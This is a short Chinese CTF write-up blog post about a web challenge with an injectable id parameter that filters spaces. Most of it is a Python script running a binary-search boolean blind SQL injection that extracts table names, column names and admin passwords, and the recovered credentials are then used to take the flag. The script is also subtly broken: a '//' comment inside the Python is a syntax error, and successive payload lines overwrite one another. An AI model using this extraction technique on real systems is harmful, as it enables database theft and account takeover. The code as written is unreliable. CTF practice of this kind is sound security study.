---
title: '[Black Watch 入群题]Web'
date: 2024-09-09 21:17:17
tags: mysql
categories: 刷题笔记
---

### [Black Watch 入群题]Web

我们点击热点进行抓包

![image-20240909211806163](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092118282.png)

看url，我们考虑在id处进行注入

![image-20240909211939251](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092119410.png)

有注入点，通过测试，我们发现过滤了空格

<!--more-->

我们写脚本

```
import requests

url = "http://dc9682c1-a4c2-4131-8bf8-bee7632e33c7.node5.buuoj.cn:81/backend/content_detail.php?id="

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head < tail):
        mid = head + tail >> 1
        payload = "if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d,3,2)" % (
        i, mid)
        payload = "if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),%d,1))>%d,3,2)" % (
        i, mid)
        payload = "if(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d,3,2)" % (i, mid) //查询username和password

        r = requests.get(url + payload)
        # print(url+payload)
        # print(r.json())
        if "Yunen" in str(r.json()):
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(name)
    else:
        break

# 这个代码使用了id=1时的情况,使用了二分法提高了查询的速度
```

最后用第二个账号密码拿下flag

![image-20240909212149414](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092121606.png)
